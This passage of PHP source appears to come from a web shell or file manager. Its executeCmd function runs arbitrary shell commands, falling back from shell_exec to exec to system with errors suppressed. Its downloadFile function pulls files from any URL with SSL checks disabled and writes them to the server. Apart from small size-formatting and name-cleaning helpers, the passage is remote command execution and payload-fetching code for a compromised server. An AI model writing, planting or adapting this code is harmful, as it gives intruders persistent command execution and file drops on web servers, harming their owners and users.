}

function formatSize($bytes) {
    $units = ['B', 'KB', 'MB', 'GB'];
    $i = 0;
    while ($bytes >= 1024 && $i < 3) { $bytes /= 1024; $i++; }
    return round($bytes, 2) . ' ' . $units[$i];
}

function cleanName($name) {
    $name = str_replace(['../', '..\\', './'], '', $name);
    $name = preg_replace('/[^\w\-\.]/', '_', $name);
    return trim($name, '_');
}

function executeCmd($cmd, $cwd) {
    $output = '';
    $fullCmd = 'cd "' . $cwd . '" && ' . $cmd . ' 2>&1';
    
    if (function_exists('shell_exec')) {
        $output = @shell_exec($fullCmd);
    } elseif (function_exists('exec')) {
        $out = []; @exec($fullCmd, $out, $code);
        $output = implode("\n", $out);
        if ($code !== 0) $output .= "\n[!] Exit code: " . $code;
    } elseif (function_exists('system')) {
        ob_start(); @system($fullCmd, $code); $output = ob_get_clean();
        if ($code !== 0) $output .= "\n[!] Exit code: " . $code;
    } else {
        $output = '[!] No shell_exec/exec/system available';
    }
    
    return $output;
}

function downloadFile($url, $path) {
    $content = @file_get_contents($url);
    if ($content === false && function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $content = curl_exec($ch);
        curl_close($ch);
    }
    if ($content && file_put_contents($path, $content)) {
        @chmod($path, 0644);
        return true;
    }
    return false;
}

